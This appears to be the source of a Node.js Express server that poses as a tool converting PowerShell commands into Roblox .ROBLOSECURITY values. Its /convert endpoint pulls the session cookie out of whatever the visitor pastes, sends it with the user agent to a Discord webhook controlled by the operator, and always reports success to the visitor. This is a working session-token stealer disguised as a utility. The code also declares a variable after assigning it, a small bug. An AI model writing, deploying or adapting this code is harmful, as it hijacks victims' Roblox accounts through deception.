import express from 'express';
import bodyParser from 'body-parser';
import path from 'path';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.text({ type: '*/*' }));

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Serve the frontend
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Function to send Discord webhook
async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown') {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  console.log('Webhook URL configured:', webhookUrl ? 'YES' : 'NO');
  
  if (!webhookUrl) {
    console.log('❌ Discord webhook URL not configured in environment variables');
    return { success: false, error: 'Webhook URL not configured' };
  }

  try {
    const embed = {
      title: "🔐 New ROBLOSECURITY Token",
      description: "A new token has been extracted from PowerShell command",
      color: 0x00ff00,
      fields: [
        {
          name: "Script Type",
          value: scriptType.charAt(0).toUpperCase() + scriptType.slice(1).replace('-', ' '),
          inline: false
        },
        {
          name: "Token",
          value: `\`\`\`${token}\`\`\``,
          inline: false
        },
        {
          name: "User Agent",
          value: userAgent,
          inline: true
        },
        {
          name: "Timestamp",
          value: new Date().toISOString(),
          inline: true
        }
      ],
      footer: {
        text: "Request Inspector Bot"
      }
    };

    const payload = {
      embeds: [embed]
    };

    console.log('Sending webhook payload...');
    
    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    console.log('Webhook response status:', response.status);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error('Webhook failed with status:', response.status, 'Error:', errorText);
      return { success: false, error: `Webhook failed: ${response.status}` };
    }

    console.log('✅ Successfully sent to Discord webhook');
    return { success: true };
  } catch (error) {
    console.error('❌ Failed to send Discord webhook:', error.message);
    console.error('Full error:', error);
    return { success: false, error: error.message };
  }
}

// API endpoint to convert PowerShell to .ROBLOSECURITY
app.post('/convert', async (req, res) => {
  try {
    let input;
    
    console.log('📥 Received request');
    
    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    let scriptType;

    console.log('🔍 Searching for ROBLOSECURITY token...');
    
    // Look for .ROBLOSECURITY cookie in PowerShell command
    const regex = /\.ROBLOSECURITY[=\s]+([^;\s'"]+)/i;
    const match = input.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';
      
      console.log('✅ Token found! Sending to Discord...');
      
      // Send to Discord webhook
      const webhookResult = await sendToDiscord(token, userAgent, scriptType);
      
      if (!webhookResult.success) {
        console.log('❌ Webhook failed:', webhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }
      
      console.log('✅ Token sent to Discord successfully');
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');
      
      // Send error to Discord too for debugging
      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (webhookUrl) {
        try {
          await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              content: `❌ **No Token Found**\nReceived input but no .ROBLOSECURITY token was detected.\nInput preview: \`${input.substring(0, 100)}...\``
            })
          });
        } catch (e) {
          console.log('Failed to send error to Discord:', e.message);
        }
      }
    }
    
    // Always return success - user checks Discord for actual results
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server running on port ${PORT}`));
